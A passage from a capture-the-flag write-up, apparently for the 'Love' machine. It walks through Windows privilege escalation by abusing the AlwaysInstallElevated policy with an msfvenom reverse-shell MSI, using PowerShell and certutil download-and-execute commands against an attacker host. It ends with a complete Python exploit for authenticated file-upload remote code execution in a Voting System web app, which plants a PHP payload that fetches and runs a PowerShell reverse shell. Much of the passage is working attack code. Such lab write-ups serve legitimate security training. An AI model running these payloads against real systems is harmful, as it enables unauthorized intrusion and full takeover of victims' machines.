> SeTimeZonePrivilege           Change the time zone                 Disabled
> ```
>

The only interesting thing is that the user belongs to the *Remote Management Users*, since the *ports 5985* and *5986* are accessible externally, we could try to connect to the *target* via *WinRM*

But remember that we do not have any valid credentials for the user *phoebe*

We can check the existence of other users in the system as follows 

```bash
net user
```

> [!NOTE]- *Command Output*
> 
> ```bash
> User accounts for \\LOVE
> 
> Administrator            DefaultAccount           Guest                    
> Phoebe                   WDAGUtilityAccount       
> The command completed successfully.
> ```
>

Apart from the *Administrator* user, there is no one more interesting, so it seems that the *privesc* will be from the *current user* to the *Administrator* user

Let's check if there are any valid credentials stored of other users

```bash
cmdkey.exe /list
```

> [!NOTE]- *Command Output*
> 
> ```bash
> Currently stored credentials:
 >
> * NONE *
> ```
>

And there are not...

At this point, let's transfer to the *target* the ***[PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) Powershell Script*** from *PowershellEmpire*

###### *From the Attacker*

- ***Download the Powershell Script***

```bash
curl --silent --request GET --location "https://github.com/PowerShellEmpire/PowerTools/raw/refs/heads/master/PowerUp/PowerUp.ps1" --output powerup.ps1
```

- ***Build a Simple HTTP Server***

```bash
python3 -m http.server 8888
```

###### *From the Target*

- ***Download and Execute the above resource using any available [LolBas](https://lolbas-project.github.io/#) on the system***

```bash
IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.20:8888/powerup.ps1')
```

Then, execute the following *powershell function* to perform all checks

```bash
Invoke-AllChecks
```

> [!NOTE]-  *Command Output*
> 
> ```bash
> GROUP INFORMATION
> -----------------
> PS C:\xampp\htdocs\omrs\images> Invoke-AllChecks
> 
> [*] Running Invoke-AllChecks
> 
> [*] Checking if user is in a local group with administrative privileges...
> 
> [*] Checking for unquoted service paths...
> 
> [*] Checking service executable and argument permissions...
> 
> [*] Checking service permissions...
> 
> [*] Checking %PATH% for potentially hijackable .dll locations...
> 
> HijackablePath : C:\Users\Phoebe\AppData\Local\Microsoft\WindowsApps\
> AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\Phoebe\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll' 
>                  -Command '...'
> 
> [*] Checking for AlwaysInstallElevated registry key...
> 
> OutputFile    : 
> AbuseFunction : Write-UserAddMSI
> 
> [*] Checking for Autologon credentials in registry...
> 
> DefaultDomainName    : LOVE
> DefaultUserName      : phoebe
> DefaultPassword      : 
> AltDefaultDomainName : 
> AltDefaultUserName   : 
> AltDefaultPassword   : 
> 
> [*] Checking for vulnerable registry autoruns and configs...
> 
> [*] Checking for vulnerable schtask files/configs...
> 
> [*] Checking for unattended install files...
> 
> [*] Checking for encrypted web.config strings...
> 
> [*] Checking for encrypted application pool and virtual directory passwords...
> ```
>

Nothing interesting...

We could run a more comprehensive scan such as ***[Winpeas](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)***

Thefore, proceed in the same way as for the above resource

- ***From the Attacker*** ⚔️

```bash
curl --silent --request GET --location "https://github.com/peass-ng/PEASS-ng/releases/download/20250320-91fb36a0/winPEASx64.exe" --output winpeas.exe
```

```bash
python3 -m http.server 8888
```

- ***From the Target*** 🎯

```bash
Invoke-RestMethod -UseBasicParsing -Uri http://10.10.16.20:8888/winpeas.exe -OutFile C:\ProgramData\winpeas.exe
```

We run *winpeas.exe* and dump all its output to a file for further analysis from the *attacker*

```bash
C:\ProgramData\winpeas.exe log=C:\ProgramData\winpeas_out.txt
```

> [!NOTE]- *Command Output*
>
> ```bash
> "log" argument present, redirecting output to file "C:\ProgramData\winpeas_out.txt"
> ```
>

Let's transfer the above file to the attacker and analyze it 

- ***From the Attacker*** ⚔️

```bash
smbserver.py -smb2support -user 4l3xbb -password 4l3xbb smbFolder $(pwd)
```

- ***From the Target*** 🎯

```bash
net use X: \\10.10.16.20\smbFolder /USER:4l3xbb 4l3xbb
```

```bash
Copy-Item -Path C:\ProgramData\winpeas_out.txt -Destination X:\
```

Reviewing the file, we find the following sections which seems really interesting

It's about the *AlwaysInstallElevated Windows Policy*

This policy allows any user to install (execute) any *.msi* file as *NT Authority\System* on the machine

It requires that two registers are enabled, we can check it as follows →

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

> [!NOTE]- *Command Output*
> 
> ```bash
> HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
> AlwaysInstallElevated    REG_DWORD    0x1 
> ```
>

```bash
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

> [!NOTE]- *Command Output*
> 
> ```bash
> HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
> AlwaysInstallElevated    REG_DWORD    0x1
> ```
>

And there are!

So, we could craft a malicious *MSI* file using `msfvenom` and transfer it to the *target* to run it via *msiexec*

Thus, proceed as follows →

###### *From the Attacker*

- ***Create the Malicious MSI Payload with msfvenom***

```bash
msfvenom --payload windows/x64/shell_reverse_tcp LHOST=10.10.16.20 LPORT=443 --platform windows --arch x64 --format msi --out rev.msi
```

> [!NOTE]- *Command Output*
> 
> ```bash
> No encoder specified, outputting raw payload
> Payload size: 460 bytes
> Final size of msi file: 159744 bytes
> Saved as: rev.msi
> ```
>

- ***Build a Simple HTTP Server to share the created payload***

```bash
python3 -m http.server 8888
```

- ***Set up a Listening Socket using the TCP Port specified above***

```bash
rlwrap -CaR nc -nlvp 443
```

###### *From the Target*

- ***Download the malicious MSI File***

```bash
certutil.exe -urlcache -split -f http://10.10.16.20:8888/rev.msi C:\ProgramData\rev.msi
```

> [!NOTE]- *Command Output*
> 
> ```bash
> Online
> 000000  ...
> 027000
> CertUtil: -URLCache command completed successfully.
> ```
>

- ***Run the MSI File as follows***

```bash
msiexec.exe /quiet /qn /i C:\ProgramData\rev.msi
```

And we got the reverse connection!!

> [!NOTE]- *Simple HTTP Server Output*
> 
> ```bash
> 10.129.48.103 - - [29/Mar/2025 13:05:53] "GET /rev.msi HTTP/1.1" 200 -
> 10.129.48.103 - - [29/Mar/2025 13:05:53] "GET /rev.msi HTTP/1.1" 200 -
> ```
>

> [!NOTE]- *RLWrap + Netcat Output*
> 
> ```bash
> listening on [any] 443 ...
> connect to [10.10.16.20] from (UNKNOWN) [10.129.48.103] 63663
> Microsoft Windows [Version 10.0.19042.867]
>  (c) 2020 Microsoft Corporation. All rights reserved.
> 
> C:\WINDOWS\system32>
> ```
>

So, we are on the *remote machine* as *NT Authority\System* 😊

```bash
whoami
```

> [!NOTE]- *Command Output*
> 
> ```bash
> nt authority\system
> ```
>

Just grab the content of the *root.txt* flag and move on to the next machine!

```bash
type C:\Users\Administrator\Desktop\root.txt
```

---

#### Custom Exploits

##### *Voting System RCE*

> ***[Reference](https://github.com/4l3xBB/Exploits/blob/main/VotingSystem/votingSystemRCE.py)***

> [!BUG]- *votingSystemRCE.py*
>
> ```python
> #!/usr/bin/env python3
> 
> import requests
> import signal
> import sys
> import os
> import time
> import argparse
> import socket
> import threading
> import http.server
> import socketserver
> 
> from pwn import *
> from colorama import Fore, Style
> 
> def sigintHandler(sig: signal.Signals, frame: types.FrameType | None) -> None:
> 
>     """
>     Function to handle SIGINT Signals
> 
>         - Print Information
>         - Reset SIGINT Handler
>         - Send a SIGINT Signal to the current Process instead of sys.exit()(WRONG!!)
>     """
> 
>     print('\n')
>     p = log.progress(Fore.CYAN + "Signal" + Style.RESET_ALL)
>     p.status(Fore.MAGENTA + f"SIGINT Signal sent to {sys.argv[0]}. {Fore.RED}Exiting... ⌛" + Style.RESET_ALL)
> 
>     time.sleep(1)
> 
>     signal.signal(signal.SIGINT, signal.SIG_DFL)
> 
>     os.killpg(os.getpid(), signal.SIGINT)
> 
> def banner() -> str:
> 
>     return f'''{Fore.GREEN}
> ▗▖  ▗▖ ▄▄▄     ■  ▄ ▄▄▄▄    ▗▄▄▖▄   ▄  ▄▄▄  ■  ▗▞▀▚▖▄▄▄▄
> ▐▌  ▐▌█   █ ▗▄▟▙▄▖▄ █   █  ▐▌   █   █ ▀▄▄▗▄▟▙▄▖▐▛▀▀▘█ █ █
> ▐▌  ▐▌▀▄▄▄▀   ▐▌  █ █   █   ▝▀▚▖ ▀▀▀█ ▄▄▄▀ ▐▌  ▝▚▄▄▖█   █
>  ▝▚▞▘         ▐▌  █     ▗▄▖▗▄▄▞▘▄   █      ▐▌
>               ▐▌       ▐▌ ▐▌     ▀▀▀       ▐▌
>                         ▝▀▜▌
>                        ▐▙▄▞▘
>          ▗▄▄▄▖▄   ▄ ▄▄▄▄  █  ▄▄▄  ▄    ■
>          ▐▌    ▀▄▀  █   █ █ █   █ ▄ ▗▄▟▙▄▖
>          ▐▛▀▀▘▄▀ ▀▄ █▄▄▄▀ █ ▀▄▄▄▀ █   ▐▌
>          ▐▙▄▄▖      █     █       █   ▐▌
>                     ▀                 ▐▌{Style.RESET_ALL}
>     '''
> 
> def revShellWarning(ip: str, port: int) -> str:
> 
>     return f'''{Fore.MAGENTA}
> [!] {Fore.RED}The Reverse Shell obtained is not associated with a stable TTY/PTY ❗
> 
> {Fore.MAGENTA}[+] {Fore.BLUE}Try to stablish another reverse connection using →
> 
>     {Fore.CYAN}[*] {Fore.MAGENTA}rlwrap -CaR nc -nlvp {port}
>     '''
> 
> class Exploit:
> 
>     def __init__(self, url: str, user: str, password: str, ip: str, port: int, httpPort: int):
> 
>         self.url = url.rstrip('/')
>         self.user = user
>         self.password = password
>         self.ip = ip
>         self.port = port
>         self.httpPort = httpPort
>         self.file = 'cmd.php'
>         self.payload = f'<?=`powershell.exe -Command IEX (IWR -UseBasicParsing -Uri http://{self.ip}:{self.httpPort}/rev.ps1)`?>'
>         self.session = requests.Session()
> 
>     def _exceptionMessage(self, message: str) -> str:
> 
>         """
>         Method for printing formatted error messages
>         """
> 
>         log.failure(Fore.RED + message + Style.RESET_ALL)
> 
>     def doLogin(self) -> bool:
> 
>         """
>         This method logs into the VotingSystem Admin Panel with the credentials provided
> 
>         URL -> http[s]://<IP_ADDRESS|HOSTNAME>/admin/login.php
> 
>         Post Fields -> { Username ~ Password ~ Login }
> 
>         """
> 
>         print()
>         p = log.progress(Fore.CYAN + "Login" + Style.RESET_ALL)
>         p.status(Fore.MAGENTA + "Logging into the Admin Panel... ⌛" + Style.RESET_ALL)
>         time.sleep(1)
> 
>         login_url = self.url + '/admin/login.php'
> 
>         post_data = {
>             'username' : self.user,
>             'password' : self.password,
>             'login' : ''
>         }
> 
>         try:
>             r = self.session.post(login_url, data=post_data)
> 
>             if "Dashboard" in r.text:
> 
>                 p.success(Fore.GREEN + f"Login sucessfull as {self.user} using {self.password} ✔" + Style.RESET_ALL)
>                 return True
> 
>             else:
>                 p.failure(Fore.RED + f"Something went wrong trying to logging. Try with valid credentials" + Style.RESET_ALL)
>                 return False
> 
>         except requests.RequestException as e:
> 
>             self._exceptionMessage(f"Request Error: {e}")
>             sys.exit(1)
> 
>     def payloadSetup(self, file) -> bool:
> 
>         """
>         This method modifies the hardcoded IP:Port in rev.ps1 file to the ones specified as arguments
>         in this script
> 
>         rev.ps1 is a powershell script which stablish a reverse connection to the specified IP:Port
> 
>         Ref -> [Nishang Reverse Shell TCP Port Oneliner](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)
>         """ 
> 
>         socket_pattern = r'\'\d{1,3}(\.\d{1,3}){3}\',\d{1,5}'
> 
>         socket = f'\'{self.ip}\',{self.port}'
> 
>         try:
>             with open(file, 'r') as f:
> 
>                 fcontent = f.read().strip('\n')
> 
>             rev_ps = re.sub(socket_pattern, socket, fcontent)
> 
>             if rev_ps:
> 
>                 with open(file, 'w') as f:
> 
>                     f.write(rev_ps)
> 
>                     return True
>             else:
>                 return False
> 
>         except FileNotFoundError:
> 
>             self._exceptionMessage("File Not Found")
>             sys.exit(1)
> 
>         except Exception as e:
> 
>             self._exceptionMessage(f"Error: {e}")
>             sys.exit(1)
> 
>     def uploadMaliciousFile(self) -> bool:
> 
>         """
>         This method uploads a malicious file as the admin user profile in the Update Profile Section
> 
>         The malicious file is a PHP Script which contains a Powershell Oneliner. This oneliner makes an
>         HTTP Request to the shared rev.ps1 file via a Simple HTTP Server
> 
>         Oneliner -> powershell.exe -Command IEX (IWR -UseBasicParsing -Uri http[s]://IP_ADDRESS:PORT/rev.ps1)
>         """
> 
>         print()
>         p = log.progress(Fore.CYAN + "Upload" + Style.RESET_ALL)
>         p.status(Fore.MAGENTA + "Uploading the malicious file... ⌛" + Style.RESET_ALL)
>         time.sleep(1)
> 
>         upload_url = self.url + '/admin/profile_update.php'
> 
>         post_data = {
>             'username' : self.user,
>             'password' : self.password,
>             'firstname' : 'test',
>             'lastname' : 'test',
>             'curr_password' : self.password,
>             'save': ''
>         }
> 
>         file = { 'photo' : ( self.file, self.payload, 'application/x-php') }
> 
>         try:
>             r = self.session.post(upload_url, data=post_data, files=file)
> 
>             if "Admin profile updated successfully" in r.text:
> 
>                 p.success(Fore.GREEN + "Malicious File 💀 uploaded successfully ✔" + Style.RESET_ALL)
>                 return True
> 
>             else:
>                 p.failure(Fore.RED + "Could not upload the malicious file ❌" + Style.RESET_ALL)
>                 return False
> 
>         except requests.RequestException as e:
> 
>             self._exceptionMessage(f"Request Error: {e}")
>             sys.exit(1)
> 
>     def setHTTPServer(self, port: int) -> None:
> 
>         """
>         This method builds a Simple HTTP Server to share the rev.ps1 resource, which is requested by the
>         uploaded PHP Script
>         """
> 
>         class SilentHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
> 
>             def log_message(self, format, *args):
> 
>                 return
> 
>         handler = SilentHTTPRequestHandler
>         socketserver.TCPServer.allow_reuse_address = True
> 
>         with socketserver.TCPServer(("0.0.0.0", port), handler) as httpd:
> 
>             httpd.serve_forever()
> 
>     def setListener(self) -> None:
> 
>         """
>         This method sets up a Listening Socket, using the provided IP:PORT, to receive the shell from the reverse connection
>         generated on the target
>         """
> 
>         print()
>         p = log.progress(Fore.CYAN + "Socket" + Style.RESET_ALL)
>         p.status(
>             Fore.MAGENTA +
>             f"Waiting for connections on {Fore.RED}{self.ip}:{self.port}{Fore.MAGENTA}... ⌛"
>             + Style.RESET_ALL
>         )
> 
>         time.sleep(1)
> 
>         try:
>             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
> 
>                 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
>                 s.bind((self.ip, int(self.port)))
>                 s.listen(1)
> 
>                 conn, addr = s.accept()
> 
>                 p.status(Fore.GREEN + f"Connection received from {addr[0]}:{addr[1]}" + Style.RESET_ALL)
> 
>                 print(revShellWarning(self.ip, self.port))
> 
>                 print(Fore.RED + f'[+] {Fore.YELLOW}Press [Enter] to get the Reverse Shell' + Style.RESET_ALL)
>                 print(Fore.RED + f'\n[+] {Fore.YELLOW}Press C-c or type "exit" to quit the Shell\n' + Style.RESET_ALL)
> 
>                 conn_in = conn.makefile('rb', buffering=0)
>                 conn_out = conn.makefile('wb', buffering=0)
> 
>                 while True: 
> 
>                     cmd = input()
> 
>                     if cmd.lower() == 'exit':
> 
>                         p.failure(Fore.RED + "Exiting... ⌛" + Style.RESET_ALL)
>                         time.sleep(1)
> 
>                         os.killpg(os.getpid(), signal.SIGINT)
> 
>                     conn_out.write((cmd + '\n').encode())
>                     conn_out.flush()
>                     time.sleep(1)
> 
>                     print(conn_in.read(4096).decode(), end='')
> 
>         except socket.error as e:
> 
>             self._exceptionMessage(f"Socket Error: {e}")
>             sys.exit(1)
> 
>         except Exception as e:
> 
>             self._exceptionMessage(f"Error: {e}")
>             sys.exit(1)
> 
>     def getReverseShell(self) -> None:
> 
>         """
>         It requests the PHP Script uploaded via the Arbitrary File Upload vector in order to trigger the HTTP request made
>         by this PHP Script
>         """
> 
>         print()
>         p = log.progress(Fore.CYAN + "Reverse Shell 🐉" + Style.RESET_ALL)
>         p.status(Fore.MAGENTA + "Getting a Reverse Shell through the uploaded file... ⌛" + Style.RESET_ALL)
>         time.sleep(1)
> 
>         uploaded_file_url = self.url + '/images/' + self.file
> 
>         try:
>             r = self.session.get(uploaded_file_url)
> 
>             if r.status_code == 200:
> 
>                 p.success(Fore.GREEN + "Shell sent correctly ✔" + Style.RESET_ALL) 
>                 return True
> 
>             else:
>                 p.failure(Fore.RED + "Something went wrong while sending the Shell ❌" + Style.RESET_ALL)
>                 return False
> 
>         except requests.RequestExcept as e:
> 
>             self._exceptionMessage(f"Request Error: {e}")
>             sys.exit(1)
> 
>     def runExploit(self) -> None:
> 
>         """
>         Method which executes the other instance methods
>         """
> 
>         if not self.doLogin() or not self.payloadSetup('rev.ps1'):
> 
>             return False
> 
>         if self.uploadMaliciousFile():
> 
>             lthread1 = threading.Thread(target=self.setListener)
>             lthread2 = threading.Thread(target=self.setHTTPServer, args=(self.httpPort,))
> 
>             lthread1.start()
>             lthread2.start()
>             time.sleep(1)
> 
>             self.getReverseShell()
> 
>             lthread1.join()
> 
> 
> def main() -> None:
> 
>     print(banner())
> 
>     signal.signal(signal.SIGINT, sigintHandler)
> 
>     parser = argparse.ArgumentParser(
>         description=Fore.MAGENTA + "Authenticated RCE via File Upload Profile in Voting System Application" + Style.RESET_ALL
>     )
> 
>     parser.add_argument('url', metavar='admin_panel_url', help='Voting System URL e.g. http://<IP_ADDRESS>')
>     parser.add_argument('user', metavar='user', help='Admin Panel User')
>     parser.add_argument('passwd', metavar='password', help='Admin Panel Password')
>     parser.add_argument('ip', metavar='attacker_ip', help='Attacker IP')
>     parser.add_argument('port', metavar='attacker_port', type=int, help='Attacker Listening Port')
>     parser.add_argument('httpPort', metavar='http_server_port', type=int, help='Simple HTTP Server\'s Port which hosts rev.ps1 payload')
> 
>     opts = parser.parse_args()
> 
>     exploit = Exploit(opts.url, opts.user, opts.passwd, opts.ip, opts.port, opts.httpPort)
> 
>     exploit.runExploit()
> 
> if __name__ == '__main__':
> 
>     main()
> ```
>

![[votingSystem.gif|450]]

> ***Zoom In***